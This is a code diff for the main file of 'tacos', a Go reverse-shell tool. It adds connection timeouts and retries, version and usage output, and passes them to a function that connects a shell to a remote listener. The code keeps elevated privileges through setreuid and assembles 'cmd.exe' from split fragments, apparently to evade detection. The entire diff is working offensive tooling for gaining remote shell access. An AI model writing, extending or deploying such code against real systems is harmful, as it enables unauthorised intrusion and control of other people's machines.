@@ -11,17 +11,27 @@ import (
 	"github.com/ariary/tacos/pkg/tacos"
 )
 
-var Remote string
+var (
+	Remote  string
+	Version = "dev"
+)
 
 func main() {
-	//var detect, daemon bool
-	var detect, setreuid bool
+	var detect, setreuid, version bool
 	var shell string
+	var timeout, maxRetries int
 	flag.BoolVar(&detect, "detect", false, "Detect default shell to use it in reverse shell")
-	//TODO: flag.BoolVar(&daemon, "daemon", false, "Disown the process from the terminal")
-	flag.StringVar(&shell, "shell", "/bin/bash", "shell to use for reverse shell") //default /bin/bash
+	flag.StringVar(&shell, "shell", "/bin/bash", "Shell to use for reverse shell")
 	flag.BoolVar(&setreuid, "setreuid", false, "Set the real and effective user IDs to the EUID parameter")
+	flag.IntVar(&timeout, "timeout", 10, "Connection timeout in seconds")
+	flag.IntVar(&maxRetries, "retry", 0, "Max connection retries (0 = no retry)")
+	flag.BoolVar(&version, "version", false, "Print version and exit")
 	flag.Parse()
+
+	if version {
+		fmt.Printf("tacos %s\n", Version)
+		os.Exit(0)
+	}
 
 	if runtime.GOOS == "windows" {
 		shell = strings.ToLower(fmt.Sprintf("%s%s%s", "Cm", "D.e", "Xe"))
@@ -36,13 +46,16 @@ func main() {
 	}
 
 	if Remote == "" {
-		fmt.Println("Usage: tacos [listener_url]:[port]")
+		fmt.Println("Usage: tacos [options] [listener_url]:[port]")
+		fmt.Println("\nOptions:")
+		flag.PrintDefaults()
 		os.Exit(1)
 	}
-	if setreuid { //to fix: undefined: syscall.Setreuid for windows
-		euid := syscall.Geteuid()    //effective ID
-		syscall.Setreuid(euid, euid) //set real user id to eid, Print error if you want to debug
+
+	if setreuid {
+		euid := syscall.Geteuid()
+		syscall.Setreuid(euid, euid)
 	}
 
-	tacos.ShellReverse(Remote, shell)
+	tacos.ShellReverse(Remote, shell, timeout, maxRetries)
 }
